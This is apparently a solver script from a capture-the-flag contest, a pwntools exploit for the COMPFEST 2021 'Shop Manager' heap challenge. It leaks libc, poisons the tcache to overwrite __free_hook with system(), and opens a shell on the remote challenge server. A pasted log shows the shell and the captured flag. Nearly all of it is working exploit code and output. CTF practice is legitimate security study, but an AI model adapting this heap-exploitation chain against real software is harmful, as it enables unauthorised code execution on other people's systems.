from pwn import *

#context(os='linux', arch='amd64')
context.log_level = 'debug'
context.terminal = ['/usr/bin/tmux','sp','-h']

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "103.152.242.242"
  PORT = 39221
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  #ibc = elf.libc

def Add(data, price):
  s.sendlineafter("> ", "1")
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def Delete(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("): ", str(idx))

def Edit(idx, data, price):
  s.sendlineafter("> ", "3")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("name: ", data)
  s.sendlineafter("price: ", str(price))

def List():
  s.sendlineafter("> ", "4")

def Sell(idx, item):
  s.sendlineafter("> ", "5")
  s.sendlineafter("): ", str(idx))
  s.sendlineafter("item?\n", item)

def Exit():
  s.sendlineafter("> ", "6")

for i in range(16):  #0-15
  Add(chr(0x41+i)*8, 1)

# libc leak
Edit(0, "a"*0x28+p64(0x431), 1)
Delete(1) 
#gdb.attach(s)
Add("b", 2) # 15
List()
for i in range(2):
  s.recvuntil("Price: ")
libc_leak = int(s.recvuntil("\n"))
# libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
# free_hook = libc_base + libc.sym.__free_hook
# system_addr = libc_base + libc.sym.system
libc_base = libc_leak - libc.symbols['__malloc_hook'] - 0x70
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# tcache poisoning
Add("c", 3) #16
Delete(6) #15
Delete(1) #14
gdb.attach(s)
Edit(14, "d", free_hook)

# Write system address in __free_hook
Add("e", u64("/bin/sh\x00"))   # 14
Add("f", system_addr) # 15

# Start shell
Delete(14)

s.interactive()

'''
mito@ubuntu:~/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public$ python solve.py r
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 103.152.242.242 on port 39221: Done
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-public/public/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7ff49f953ca0
libc_base = 0x7ff49f568000
[*] Switching to interactive mode
$ id
/bin/sh: 1: id: not found
$ ls -l
total 2208
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 bin
-r-xr-xr-x  1 0 0   17264 Sep 12 04:33 chall
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 dev
-r--r--r--  1 0 0      56 Sep 12 04:33 flag.txt
-rwxr-xr-x  1 0 0  179152 Sep 12 04:33 ld-2.27.so
drwxr-xr-x 21 0 0    4096 Sep 12 04:33 lib
drwxr-xr-x  3 0 0    4096 Sep 12 04:33 lib32
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 lib64
-rwxr-xr-x  1 0 0 2030928 Sep 12 04:33 libc-2.27.so
-rwxr-xr-x  1 0 0     339 Sep 12 04:33 run.sh
$ cat flag.txt
COMPFEST13{I_us3_st4Ck_p1v0T1ng_How_bouT_Y0u_dd4dfcc265}
'''
